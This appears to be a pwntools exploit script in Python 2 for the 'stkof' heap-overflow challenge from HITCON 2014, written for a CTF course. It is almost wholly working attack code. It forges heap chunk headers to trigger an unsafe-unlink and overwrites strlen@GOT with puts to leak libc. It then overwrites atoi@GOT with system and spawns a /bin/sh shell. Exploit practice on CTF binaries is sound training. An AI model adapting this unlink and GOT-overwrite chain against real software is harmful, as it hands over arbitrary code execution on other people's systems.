#!/usr/bin/python2
from pwn import *


p= process(['./ld-2.23.so','./stkof'], env={'LD_PRELOAD': '/home/jack_0f_spades/Documents/ctfs/bin_course_2019/week_1/stkof_hitcon_2014/libc-2.23.so'})
#p = process('./stkof')
e = ELF('./stkof')
libc = ELF('./libc-2.23.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#gdb.attach(p)

#First we allocate 5 chunks
def add(size):
    p.sendline('1')
    p.sendline(str(size))
    print p.recv()

def edit(index, pay):
    p.sendline('2')
    p.sendline(str(index))
    p.sendline(str(len(pay)))
    p.send(pay)
    p.recv()


def delete(index):
    p.sendline('3')
    p.sendline(str(index))
    p.recv()

strlen_got = e.got['strlen']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
atoi_got = e.got['atoi']


add(200)
add(200)
add(200)
add(200)
add(200)

forward = 0x602140
backward = 0x602148

## EDITING CHUNK 3'S HEADER SO THAT CHUNK 2 IS UNLINKED
pay1 = p64(0x0) + p64(0x0) + p64(forward) + p64(backward) + "B"*(0xc0-32) + p64(0xc0) + p64(0xd0)
edit(3,pay1)
delete(4)


## REPLACE STRLEN WITH PUTS
pay2 = "A"*8 + p64(strlen_got)
edit(3, pay2)
edit(1, p64(puts_plt))

## LEAKING PUTS ADDRESS USING THE 4th FUNCTIONALITY OF BINARY WHCH USED STRLEN
pay3 = "A"*8 + p64(puts_got)
edit(3,pay3)
p.sendline('4')
p.sendline('1')
leak = p.recv(6)
leak += '\x00' + '\x00'
leak = u64(leak)
log.info("Leak:" + hex(leak))
libc_base = leak - libc.symbols['puts']
log.info("Libc Base:" + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
log.info("SYSTEM:" + hex(system_addr))


## WRITING SYSTEM ADDRESS TO ATOI@GOT
pay4 = "A"*8 + p64(atoi_got)
edit(3,pay4)
edit(1, p64(system_addr))

p.sendline('/bin/sh')
p.interactive()
